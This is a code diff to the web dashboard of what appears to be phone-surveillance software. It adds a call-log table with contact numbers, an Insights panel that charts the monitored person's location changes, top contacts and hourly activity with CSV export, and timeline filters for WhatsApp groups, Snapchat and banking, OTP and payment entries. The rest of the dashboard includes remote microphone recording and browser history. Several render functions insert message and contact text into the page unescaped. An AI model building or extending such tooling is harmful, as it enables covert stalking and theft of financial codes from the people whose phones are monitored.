@@ -232,6 +232,7 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <button class="tab-btn" data-tab="photos">&#x1F4F8; Photos</button>
 <button class="tab-btn" data-tab="videos">&#x1F3AC; Videos</button>
 <button class="tab-btn" data-tab="timeline">&#x1F4AC; Timeline</button>
+<button class="tab-btn" data-tab="calls">&#x1F4DE; Calls</button>
 <button class="tab-btn" data-tab="apps">&#x1F4CA; Apps</button>
 <button class="tab-btn" data-tab="geofence">&#x2699; Geo</button>
 <button class="tab-btn" data-tab="fcm">&#x1F4E1; Sync</button>
@@ -239,6 +240,7 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <button class="tab-btn" data-tab="voice">&#x1F3A4; Voice</button>
 <button class="tab-btn" data-tab="remote">&#x1F3A4; Remote</button>
 <button class="tab-btn" data-tab="playback">&#x25B6; Playback</button>
+<button class="tab-btn" data-tab="insights">&#x1F4CA; Insights</button>
 <button class="tab-btn" data-tab="storage">&#x1F4E6; Storage</button>
 <button class="tab-btn" data-tab="browser">&#x1F310; Browser</button>
 <button class="tab-btn" data-tab="permissions">&#x1F512; Perms</button>
@@ -362,8 +364,13 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 </div>
 <div id="tab-timeline">
 <div class="filter-chips" id="timelineChips">
-<span class="chip active" data-filter="call" data-label="&#x1F4DE; Call">&#x1F4DE; Call</span>
+<span class="chip active" data-filter="all" data-label="All">All</span>
+<span class="chip" data-filter="location" data-label="&#x1F4CD; Location">&#x1F4CD; Location</span>
+<span class="chip" data-filter="call" data-label="&#x1F4DE; Call">&#x1F4DE; Call</span>
 <span class="chip" data-filter="whatsapp_individual" data-label="&#x1F4AC; Individual">&#x1F4AC; Individual</span>
+<span class="chip" data-filter="whatsapp_group" data-label="&#x1F465; Groups">&#x1F465; Groups</span>
+<span class="chip" data-filter="snapchat" data-label="&#x1F4F8; Snapchat">&#x1F4F8; Snapchat</span>
+<span class="chip" data-filter="banking" data-label="&#x1F4B3; Banking">&#x1F4B3; Banking</span>
 </div>
 <div style="display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap">
 <select id="timelinePeriod" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:6px 8px;border-radius:var(--radius);font-size:13px">
@@ -387,6 +394,7 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <div id="waWizardOverlay" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.68);z-index:9999;align-items:center;justify-content:center;padding:16px">
 <div id="waWizardCard" style="background:var(--card);border:1px solid var(--border);border-radius:14px;max-width:580px;width:100%;max-height:88vh;overflow:auto;padding:18px;font-size:14px"></div>
 </div>
+<div id="tab-calls"><table><thead><tr><th>Time</th><th>Number</th><th>Duration</th><th>Type</th></tr></thead><tbody id="callsBody"></tbody></table></div>
 <div id="tab-apps"><div class="app-period" style="display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap">
 <span class="app-period-btn active" data-period="today">Today</span>
 <span class="app-period-btn" data-period="yesterday">Yesterday</span>
@@ -530,6 +538,26 @@ On-demand mic recordings triggered from the dashboard. Segments are auto-assembl
 
 <div id="remoteHintBanner" style="display:none;font-size:12px;color:var(--warning);background:var(--card);border:1px solid var(--warning);padding:8px 10px;border-radius:var(--radius);margin-bottom:8px"></div>
 <div id="remoteRecordingsList"><div class="label">No remote recordings yet</div></div>
+</div>
+<div id="tab-insights">
+<div class="grid" style="grid-template-columns:1fr 1fr 1fr;margin-bottom:10px">
+<div><div class="label">&#x1F4CA; Today's Activity</div><div class="value" id="inTodayActivity">--</div></div>
+<div><div class="label">&#x1F4CD; Unique Locations</div><div class="value" id="inUniqueLocs">--</div></div>
+<div><div class="label">&#x1F4DE; Calls Today</div><div class="value" id="inCallsToday">--</div></div>
+</div>
+<div class="card" style="border-left-color:var(--accent)">
+<div class="label">&#x1F504; Location Changes (last 24h)</div>
+<div id="inLocChart" style="height:50px;display:flex;align-items:flex-end;gap:3px;margin-top:6px"></div>
+</div>
+<div class="card" style="border-left-color:var(--accent)">
+<div class="label">&#x1F4CA; Top Contacts</div>
+<div id="inTopContacts" style="margin-top:4px"><span class="label">Load timeline to analyze</span></div>
+</div>
+<div class="card" style="border-left-color:var(--accent)">
+<div class="label">&#x1F4C5; Activity Heatmap (hour of day)</div>
+<div id="inHeatmap" style="display:flex;gap:2px;margin-top:6px;flex-wrap:wrap"></div>
+</div>
+<button class="chip" style="background:var(--accent);color:#000;margin-top:8px" onclick="exportData()">&#x1F4E5; Export Data (CSV)</button>
 </div>
 <div id="tab-storage">
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
@@ -1699,9 +1727,10 @@ document.querySelectorAll('.tab-btn').forEach(btn => {
         loadDefaultHistory();
       }
       renderPlaybackTab();
-     }
-     if (btn.dataset.tab === 'storage') refreshStorage();
-     if (btn.dataset.tab === 'browser') pollBrowserHistory();
+    }
+    if (btn.dataset.tab === 'insights') renderInsights();
+    if (btn.dataset.tab === 'storage') refreshStorage();
+    if (btn.dataset.tab === 'browser') pollBrowserHistory();
     if (btn.dataset.tab === 'permissions') { if (window.permCache) renderPermissions(); else pollPermissions(); }
     if (btn.dataset.tab === 'photos') { renderPhotosFromCache(); pollPhotos(); }
     if (btn.dataset.tab === 'videos') { renderVideosFromCache(); pollVideos(); }
@@ -2432,6 +2461,7 @@ function startPolling() {
   schedulePoll('fcm', intervals.fcm, pollFcmToken);
   schedulePoll('queue', 30000, pollQueueSize);
   schedulePoll('browser', 120000, pollBrowserHistory);
+  schedulePoll('insights', 120000, renderInsights);
   schedulePoll('wifi', 60000, pollWifiScans);
   schedulePoll('logcat', 60000, pollLogcat);
   schedulePoll('health', intervals.health, pollHealth);
@@ -3328,7 +3358,9 @@ async function pollApps() {
 async function pollHistory() {
   if (!selectedDevice) return;
   const listEl = document.getElementById('timelineList');
+  const callsEl = document.getElementById('callsBody');
   if (listEl) listEl.innerHTML = '<div class="label">\u{1F4E1} Loading timeline...</div>';
+  if (callsEl) callsEl.innerHTML = '<tr><td colspan="4" style="color:var(--muted)">Loading...</td></tr>';
   try {
     // Fetch ALL timeline entries by paging backward in chunks of 1000
     // (limitToLast + endAt on the oldest key so far, dedup on the boundary).
@@ -3351,11 +3383,13 @@ async function pollHistory() {
     if (!Object.keys(all).length) {
       timelineCache = null;
       if (listEl) listEl.innerHTML = '<div class="label">No entries</div>';
+      if (callsEl) callsEl.innerHTML = '<tr><td colspan="4" style="color:var(--muted)">No calls</td></tr>';
       return;
     }
     timelineCache = Object.values(all)
       .sort((a, b) => (parseInt(b.ts_ms) || 0) - (parseInt(a.ts_ms) || 0));
     renderTimeline(timelineCache);
+    renderCalls(timelineCache);
    } catch (e) {
     console.error('pollHistory error:', e);
     if (listEl) listEl.innerHTML = '<div class="label" style="color:var(--danger)">Timeline load error: ' + e.message + '</div>';
@@ -5176,7 +5210,7 @@ async function loadMoreTimeline() {
 }
 
 // --- Timeline ---
-let timelineFilter = 'call';
+let timelineFilter = 'all';
 document.querySelectorAll('.chip[data-filter]').forEach(chip => {
   chip.addEventListener('click', () => {
     document.querySelectorAll('.chip[data-filter]').forEach(c => c.classList.remove('active'));
@@ -5202,9 +5236,14 @@ function renderTimeline(docs) {
   const counts = { all: docs.length };
   for (const d of docs) {
     const type = (d.type || '').toLowerCase();
+    if (type === 'location') counts.location = (counts.location || 0) + 1;
     if (type.includes('call')) counts.call = (counts.call || 0) + 1;
     const cls = waIsWhatsApp(d) ? waClassOf(d) : null;
+    if (cls) counts.whatsapp = (counts.whatsapp || 0) + 1;
     if (cls === 'individual') counts.whatsapp_individual = (counts.whatsapp_individual || 0) + 1;
+    if (cls === 'group') counts.whatsapp_group = (counts.whatsapp_group || 0) + 1;
+    if (type.includes('snapchat')) counts.snapchat = (counts.snapchat || 0) + 1;
+    if (type.includes('banking') || type.includes('financial') || type.includes('otp') || type.includes('payment') || type.includes('transaction')) counts.banking = (counts.banking || 0) + 1;
   }
   document.querySelectorAll('.chip[data-filter]').forEach(chip => {
     const f = chip.dataset.filter;
@@ -5220,8 +5259,12 @@ function renderTimeline(docs) {
   let filtered = docs.filter(d => {
     const type = (d.type || '').toLowerCase();
     if (timelineFilter === 'all') return true;
+    if (timelineFilter === 'location') return type === 'location';
     if (timelineFilter === 'call') return type.includes('call');
     if (timelineFilter === 'whatsapp_individual') return waIsWhatsApp(d) && waClassOf(d) === 'individual';
+    if (timelineFilter === 'whatsapp_group') return waIsWhatsApp(d) && waClassOf(d) === 'group';
+    if (timelineFilter === 'snapchat') return type.includes('snapchat');
+    if (timelineFilter === 'banking') return type.includes('banking') || type.includes('financial') || type.includes('otp') || type.includes('payment') || type.includes('transaction');
     return true;
   });
   const totalFiltered = filtered.length;
@@ -5249,30 +5292,29 @@ function renderTimeline(docs) {
   }
   let html = '';
   for (const [day, entries] of Object.entries(groups)) {
-     const calls = entries.filter(e => (e.type || '').includes('call')).length;
-     const msgs = entries.filter(e => (e.type || '').includes('whatsapp') || (e.type || '').includes('message')).length;
-     const summary = [calls ? `${calls}\u{1F4DE}` : '', msgs ? `${msgs}\u{1F4AC}` : ''].filter(Boolean).join(' ');
+    const locs = entries.filter(e => (e.type || '').toLowerCase() === 'location').length;
+    const calls = entries.filter(e => (e.type || '').includes('call')).length;
+    const msgs = entries.filter(e => (e.type || '').includes('whatsapp') || (e.type || '').includes('message')).length;
+    const snaps = entries.filter(e => (e.type || '').includes('snapchat')).length;
+    const banks = entries.filter(e => (e.type || '').includes('banking') || (e.type || '').includes('financial') || (e.type || '').includes('otp') || (e.type || '').includes('payment') || (e.type || '').includes('transaction')).length;
+    const summary = [locs ? `${locs}\u{1F4CD}` : '', calls ? `${calls}\u{1F4DE}` : '', msgs ? `${msgs}\u{1F4AC}` : '', snaps ? `${snaps}\u{1F4F8}` : '', banks ? `${banks}\u{1F4B3}` : ''].filter(Boolean).join(' ');
     html += `<div class="tl-group"><div class="tl-day">${day}</div><div class="tl-summary">${summary}</div>`;
     for (const d of entries) {
       const type = d.type || '';
       const ts = parseInt(d.ts_ms || '0');
       const icon = type.includes('snapchat') ? '\u{1F4F8}' : type.includes('whatsapp') ? '\u{1F4AC}' : type.includes('call') ? '\u{1F4DE}' : type.includes('banking') || type.includes('financial') || type.includes('otp') || type.includes('payment') || type.includes('transaction') ? '\u{1F4B3}' : '\u{1F4CD}';
-       const contact = d.contactName || d.contact || '';
-       const number = d.contactNumber || '';
-       const isCall = type.includes('call');
-       const contactDisplay = (isCall && contact && number) ? `${contact} (${number})` : contact;
-       const callLoc = isCall && d.location ? `<br><span style="font-size:13px;color:var(--muted)">\u{1F4CD} ${d.location}</span>` : '';
-       const msg = d.messagePreview || '';
-       const dur = d.duration || '';
-       const dir = d.direction || '';
-       const lat = d.lat, lng = d.lng;
-       const isLoc = type === 'location' && lat && lng;
-       const waCls = waIsWhatsApp(d) ? waClassOf(d) : '';
-       const groupTag = waCls === 'group' ? ' <span class="grouptag">\u{1F465} ' + (d.groupName ? d.groupName.replace(/[\u200e\u202b\u202c\u200f*]/g, '') : 'گروپ') + '</span>' : (waCls === 'noise' ? ' <span class="grouptag" style="color:var(--muted);border-color:var(--border);background:rgba(120,120,120,.12)">· system</span>' : '');
-       html += `<div class="card"${isLoc ? ` onclick="flyToLocation(${lat}, ${lng}, '${contact ? contact.replace(/'/g, "\\'") : pkt(ts)}')" style="cursor:pointer"` : ''}>
-         <div class="time">${icon} ${pkt(ts)}</div>
-         <div>${contactDisplay}${msg ? ': ' + msg : ''}${groupTag}${dur ? ' \u2022 ' + dur + 's' : ''}${dir ? ' ['+dir+']' : ''}${callLoc}${isLoc ? ' \u{1F4CD} click to fly' : ''}</div>
-       </div>`;
+      const contact = d.contactName || d.contact || '';
+      const msg = d.messagePreview || '';
+      const dur = d.duration || '';
+      const dir = d.direction || '';
+      const lat = d.lat, lng = d.lng;
+      const isLoc = type === 'location' && lat && lng;
+      const waCls = waIsWhatsApp(d) ? waClassOf(d) : '';
+      const groupTag = waCls === 'group' ? ' <span class="grouptag">\u{1F465} ' + (d.groupName ? d.groupName.replace(/[\u200e\u202b\u202c\u200f*]/g, '') : 'گروپ') + '</span>' : (waCls === 'noise' ? ' <span class="grouptag" style="color:var(--muted);border-color:var(--border);background:rgba(120,120,120,.12)">· system</span>' : '');
+      html += `<div class="card"${isLoc ? ` onclick="flyToLocation(${lat}, ${lng}, '${contact ? contact.replace(/'/g, "\\'") : pkt(ts)}')" style="cursor:pointer"` : ''}>
+        <div class="time">${icon} ${pkt(ts)}</div>
+        <div>${contact}${msg ? ': ' + msg : ''}${groupTag}${dur ? ' \u2022 ' + dur + 's' : ''}${dir ? ' ['+dir+']' : ''}${isLoc ? ' \u{1F4CD} click to fly' : ''}</div>
+      </div>`;
     }
     html += '</div>';
   }
@@ -5286,8 +5328,8 @@ function renderTimeline(docs) {
     console.error('renderTimeline error:', e);
     list.innerHTML = '<div class="label" style="color:var(--danger)">Timeline render error: ' + e.message + '. <button onclick="pollHistory()">Retry</button></div>';
   }
-  }
-  
+}
+
 // ====== WhatsApp Review Wizard ======
 let waWizard = null;
 
@@ -5485,6 +5527,21 @@ document.getElementById('timelineSearch')?.addEventListener('input', function() 
   }, 300);
 });
 
+function renderCalls(docs) {
+  const body = document.getElementById('callsBody');
+  const calls = docs.filter(d => (d.type || '').includes('call')).slice(0, 100);
+  body.innerHTML = calls.map(d => {
+    const ts = parseInt(d.ts_ms || '0');
+    const name = d.contactName || d.contact || '';
+    const number = d.contactNumber || '';
+    const numDisplay = name && number ? `${name} (${number})` : name || number || '--';
+    const dur = d.duration || '--';
+    const dir = d.direction || '--';
+    const loc = d.location || '';
+    return `<tr><td>${pktShort(ts)}</td><td>${numDisplay}</td><td>${dur}s</td><td>${dir}${loc ? '<br><span style="font-size:13px;color:var(--muted)">\u{1F4CD} ' + loc + '</span>' : ''}</td></tr>`;
+  }).join('') || '<tr><td colspan="4" style="color:var(--muted)">No calls</td></tr>';
+}
+
 // --- App period selector ---
 document.querySelectorAll('.app-period-btn').forEach(btn => {
   btn.addEventListener('click', () => {
@@ -5506,13 +5563,13 @@ document.addEventListener('keydown', e => {
     if (text && text !== '--' && navigator.clipboard) navigator.clipboard.writeText(text).catch(() => {});
   }
   // Single-letter tab shortcuts (no modifier)
-  const letterMap = { h: 'health', p: 'photos', m: 'videos', v: 'voice', l: 'live', s: 'storage', t: 'timeline', a: 'apps', r: 'recents', g: 'geofence', w: 'wifi', b: 'browser', o: 'contacts' };
+  const letterMap = { h: 'health', p: 'photos', m: 'videos', v: 'voice', l: 'live', s: 'storage', t: 'timeline', a: 'apps', r: 'recents', g: 'geofence', w: 'wifi', b: 'browser', c: 'calls', o: 'contacts' };
   if (!e.ctrlKey && !e.metaKey && !e.altKey && letterMap[e.key]) {
     e.preventDefault();
     switchTab(letterMap[e.key]);
   }
   // 1-9 for tab switching with Alt
-  const numMap = { '1': 'live', '2': 'timeline', '3': 'recents', '4': 'apps', '5': 'photos', '6': 'videos', '7': 'storage' };
+  const numMap = { '1': 'live', '2': 'timeline', '3': 'recents', '4': 'calls', '5': 'apps', '6': 'photos', '7': 'videos', '8': 'insights', '9': 'storage' };
   if (e.key >= '1' && e.key <= '9' && e.altKey) {
     e.preventDefault();
     const tab = numMap[e.key];
@@ -5526,6 +5583,90 @@ document.addEventListener('keydown', e => {
     document.getElementById('globalSearch')?.focus();
   }
 });
+
+// --- Insights ---
+async function renderInsights() {
+  if (!selectedDevice) return;
+  try {
+  const [hist, apps, tl] = await Promise.all([
+    fetchRTDB(`devices/${selectedDevice}/location/history`),
+    fetchRTDB(`devices/${selectedDevice}/apps`),
+    fetchRTDB(`devices/${selectedDevice}/timeline`, 'orderBy="$key"&limitToLast=1000')
+  ]);
+  
+  // Location changes per hour (last 24h)
+  const locByHour = new Array(24).fill(0);
+  if (hist && typeof hist === 'object') {
+    const now = Date.now();
+    async function countLocations(obj) {
+      if (!obj || typeof obj !== 'object') return;
+      for (const [k, v] of Object.entries(obj)) {
+        if (v && typeof v === 'object' && !v.lat) {
+          await countLocations(v);
+        } else if (v && v.lat) {
+          const ts = parseInt(k);
+          if (!isNaN(ts) && now - ts < 86400000) {
+            const h = new Date(ts).getHours();
+            locByHour[h]++;
+          }
+        }
+      }
+    }
+    await countLocations(hist);
+  }
+  const locChart = document.getElementById('inLocChart');
+  if (locChart) {
+    const max = Math.max(...locByHour, 1);
+    locChart.innerHTML = locByHour.map((v, h) => 
+      `<div title="${hour12Label(h)} - ${v} changes" style="flex:1;background:var(--border);border-radius:2px;overflow:hidden;height:50px;display:flex;flex-direction:column-reverse">
+        <div style="height:${(v/max*100).toFixed(0)}%;background:var(--accent);border-radius:2px"></div>
+      </div>`
+    ).join('');
+    document.getElementById('inUniqueLocs').textContent = locByHour.filter(v => v > 0).length + ' hrs active';
+  }
+  
+  // Today's activity
+  const todayStr = new Date().toISOString().slice(0,10);
+  const todayLocs = locByHour.reduce((a, b) => a + b, 0);
+  document.getElementById('inTodayActivity').textContent = todayLocs + ' changes';
+
+  // Top contacts from timeline
+  const contactCount = {};
+  if (tl && typeof tl === 'object') {
+    let callsToday = 0;
+    Object.values(tl).forEach(entry => {
+      if (entry.type === 'call' || entry.type === 'incoming' || entry.type === 'outgoing' || entry.type === 'missed') {
+        const num = entry.number || 'unknown';
+        contactCount[num] = (contactCount[num] || 0) + 1;
+        const ts = parseInt(entry.ts_ms);
+        if (!isNaN(ts) && new Date(ts).toISOString().slice(0,10) === todayStr) callsToday++;
+      }
+    });
+    document.getElementById('inCallsToday').textContent = callsToday;
+  }
+  const sortedContacts = Object.entries(contactCount).sort((a, b) => b[1] - a[1]).slice(0, 10);
+  const tcEl = document.getElementById('inTopContacts');
+  if (tcEl) {
+    tcEl.innerHTML = sortedContacts.length
+      ? sortedContacts.map(([num, count]) =>
+          `<div style="display:flex;justify-content:space-between;padding:2px 0;font-size:14px">
+            <span>${escHtml(num)}</span><span style="color:var(--accent)">${count}x</span>
+          </div>`).join('')
+      : '<span class="label">No call data available</span>';
+  }
+
+  // Heatmap overlay
+  const heatEl = document.getElementById('inHeatmap');
+  if (heatEl) {
+    const maxH = Math.max(...locByHour, 1);
+    heatEl.innerHTML = locByHour.map((v, h) => {
+      const pct = (v / maxH * 100);
+      const intensity = pct > 75 ? '#ef4444' : pct > 50 ? '#f97316' : pct > 25 ? '#eab308' : '#6b7280';
+      return `<div title="${hour12Label(h)} - ${v}" style="width:24px;height:24px;background:${intensity};border-radius:3px;display:flex;align-items:center;justify-content:center;font-size:9px;color:${pct > 50 ? '#000' : 'var(--text)'}">${hour12Compact(h)}</div>`;
+    }).join('');
+  }
+  } catch(e) { console.error('renderInsights error:', e); }
+}
 
 // --- Storage & Cleanup ---
 function formatBytes(bytes) {
